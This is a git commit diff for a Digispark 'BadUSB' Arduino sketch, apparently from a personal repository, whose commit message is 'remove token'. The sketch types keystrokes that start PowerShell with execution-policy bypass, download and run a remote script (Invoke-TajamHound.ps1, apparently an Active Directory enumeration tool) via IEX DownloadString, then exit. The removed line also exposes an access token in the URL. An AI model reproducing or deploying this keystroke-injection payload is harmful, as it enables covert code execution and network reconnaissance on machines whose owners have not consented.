800fc137a3335b6ca374844564df5b68999ae65a
mariffy <mariff.yasri@petronas.com>
2023-11-12 23:22:03 +0800

    remove token

--- uni-bad/direktori-aktif/script/script.ino
+++ uni-bad/direktori-aktif/script/script.ino
@@ -11,9 +11,9 @@ void loop() {
   DigiKeyboard.print("powershell -exec bypass");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mariffy/nota-buku/main/uni-bad/direktori-aktif/Invoke-TajamHound.ps1?token=GHSAT0AAAAAACKFXBTCXFLN7AECY6IVUILOZKQ5PXA'); Invoke-TajamHound");
+  DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mariffy/nota-buku/main/uni-bad/direktori-aktif/Invoke-TajamHound.ps1'); Invoke-TajamHound");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(50000);
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
